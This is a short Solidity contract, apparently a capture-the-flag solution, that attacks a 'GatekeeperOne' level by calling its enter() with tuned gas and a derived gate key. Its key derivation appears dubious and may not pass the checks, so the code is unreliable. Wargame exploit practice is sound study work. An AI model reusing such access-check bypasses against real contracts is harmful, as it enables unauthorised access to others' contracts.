// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

interface GatekeeperOne {
    function enter(bytes8) external returns(bool);
}

contract HackGatekeeperOne {
    GatekeeperOne toHack = GatekeeperOne(0x45F9C1a3B2Cb89c57c890C9045Bc2F9D098ac730);

    function enterGate() external {
        // _gateKey = uint16(address(this));
        bytes2 _gateKey = bytes2(abi.encodePacked(address(this)));
        toHack.enter{gas: 8191*100}(bytes8(_gateKey));
    }
}